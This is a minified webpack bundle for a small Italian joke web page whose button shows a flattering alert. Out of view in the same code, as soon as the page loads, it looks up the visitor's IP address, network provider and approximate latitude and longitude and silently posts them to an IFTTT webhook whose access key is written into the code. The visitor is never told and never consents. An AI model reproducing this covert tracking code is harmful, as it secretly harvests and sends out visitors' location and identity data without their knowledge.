(this.webpackJsonpgrab=this.webpackJsonpgrab||[]).push([[0],{18:function(t,e,n){},19:function(t,e,n){},38:function(t,e,n){"use strict";n.r(e);var i=n(1),a=n(2),c=n.n(a),o=n(12),r=n.n(o),l=(n(18),n(19),n(20));function s(){alert("ODDIO MA SEI BELLISSIMO/A")}l.get("https://json.geoiplookup.io/").then((function(t){var e=t.data.ip,n=t.data.org,i=t.data.lat,a=t.data.long;i.toString(),a.toString(),function(t,e,n,i){var a="https://maker.ifttt.com/trigger/data_trigger/with/key/f-NHVw9KeITH9nLMbbUH6Yd2hifSrOwGcuCWWnyuMpH?value1="+t+"&value2="+e+"&value3=lat: "+n+"long: "+i;l.post(a)}(e,n,i,a)})).catch((function(t){console.error(t)}));var u=function(){return Object(i.jsx)("div",{className:"App",children:Object(i.jsxs)("header",{className:"App-header",children:[Object(i.jsx)("p",{children:"Clicca il bottone \xe8 ti dir\xf2 quanto sei bello/a!"}),Object(i.jsx)("button",{onClick:s,children:"Clicca Qui!"})]})})},d=function(t){t&&t instanceof Function&&n.e(3).then(n.bind(null,39)).then((function(e){var n=e.getCLS,i=e.getFID,a=e.getFCP,c=e.getLCP,o=e.getTTFB;n(t),i(t),a(t),c(t),o(t)}))};r.a.render(Object(i.jsx)(c.a.StrictMode,{children:Object(i.jsx)(u,{})}),document.getElementById("root")),d()}},[[38,1,2]]]);
//# sourceMappingURL=main.624d4d6f.chunk.js.map